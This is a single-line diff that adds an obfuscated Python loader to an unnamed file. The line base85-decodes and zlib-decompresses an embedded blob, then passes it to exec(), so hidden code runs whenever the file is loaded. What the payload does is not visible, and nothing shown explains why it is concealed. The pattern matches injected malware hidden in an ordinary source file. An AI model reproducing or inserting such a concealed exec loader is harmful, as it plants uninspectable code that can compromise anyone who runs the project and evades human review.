@@ -1,0 +1,1 @@
+import zlib;import base64;exec(zlib.decompress(base64.b85decode(b'c-n1FOAf*y5Z!x<ao46b6&J?TauUL#0g8|Y4XLrcy~AKN8dvk?{qnRK;8xhO-9W4rA5FlgrX%*U+`w>+;J^ileXyp8$w{RDkcvof16bjt@RD-|eb7+2jsbd+-mxTXIV-c`-wN_5CWTr+b4K@ZaialW=}u83TPvN~TV1_eGk2A4n!|bFo&d3F;PktCoj6IcV9BXn;qhNaePw2e-kix0Gto@<7{ERO|JGZ>')))
